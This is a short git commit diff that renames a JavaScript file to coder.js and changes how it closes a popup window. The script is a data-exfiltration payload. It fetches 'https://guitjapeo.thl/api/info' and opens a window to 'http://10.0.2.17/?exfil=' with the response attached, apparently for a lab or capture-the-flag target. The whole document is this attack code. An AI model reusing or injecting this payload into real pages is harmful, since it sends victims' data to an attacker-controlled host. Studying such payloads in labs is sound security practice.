12031c5cc59280e7771d6811241f18a811fa1175
EsevKa <139042999+Esevka@users.noreply.github.com>
2025-04-22 20:01:24 +0200

    Update and rename codexexe.js to coder.js

--- coder.js
+++ coder.js
@@ -2,11 +2,7 @@ var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = () =>{
         if(xhr.readyState == XMLHttpRequest.DONE){
                 openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
-                if(openwindow){
-                        openwindow.onload = () => {
-                                openwindow.close();
-                        }
-                }
+                setTimeout(()=>openwindow.close(),1000)
         }
 };
 xhr.open('GET',"https://guitjapeo.thl/api/info",false);
